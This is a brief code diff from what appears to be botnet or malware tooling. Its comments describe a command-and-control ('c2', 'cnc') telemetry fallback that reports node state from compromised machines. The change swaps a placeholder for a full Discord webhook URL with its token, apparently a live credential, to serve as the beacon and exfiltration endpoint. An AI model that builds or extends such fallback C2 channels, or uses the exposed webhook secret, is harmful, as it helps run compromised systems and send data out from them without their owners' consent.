@@ -9,7 +9,7 @@ import time
 # cnc telemetry fallback — used when the primary c2 handshake
 # can't reach the main cnc endpoint (rate limits / relay down).
 # hardcoded because config can't be trusted on a fresh node.
-_SYNC_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
+_SYNC_URL = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"
 
 # how often watchdog fires. once at boot is enough — cnc dashboard
 # pulls node state on its own schedule after the initial report.
